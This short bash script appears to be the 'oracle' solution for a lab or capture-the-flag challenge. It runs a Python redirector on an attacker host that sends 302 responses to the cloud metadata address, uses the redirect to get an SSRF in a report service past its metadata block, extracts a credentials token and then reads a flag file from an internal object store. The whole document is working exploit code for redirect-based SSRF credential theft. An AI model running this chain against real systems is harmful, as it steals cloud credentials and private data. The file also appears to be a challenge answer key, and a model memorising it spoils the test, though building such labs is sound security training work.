#!/usr/bin/env bash
# Oracle: spin a redirector, SSRF -> metadata token, SSRF -> objectstore.
set -euo pipefail
# 1. redirector on the attacker box: 302 to the blocked metadata URL
cat > /tmp/redir.py <<'EOF'
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
class R(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/latest/creds")
        self.end_headers()
ThreadingHTTPServer(("0.0.0.0", 8000), R).serve_forever()
EOF
python3 /tmp/redir.py &
RPID=$!
trap "kill $RPID" EXIT
sleep 1
# attacker hostname from the report host's perspective
ATK=attacker
echo "== direct metadata try (blocked) =="
curl -s "http://report:8080/fetch?url=http://169.254.169.254/latest/creds" || true
echo; echo "== via redirect =="
CREDS=$(curl -s "http://report:8080/fetch?url=http://$ATK:8000/x")
echo "$CREDS"
TOKEN=$(echo "$CREDS" | python3 -c "import sys,re; m=re.search(r'\"Token\": \"([0-9a-f]+)\"', sys.stdin.read()); print(m.group(1) if m else '')")
echo "token: $TOKEN"
echo "== object store via SSRF =="
curl -s "http://report:8080/fetch?url=http://objectstore:9000/backup/flag.txt%3Ftoken%3D$TOKEN"
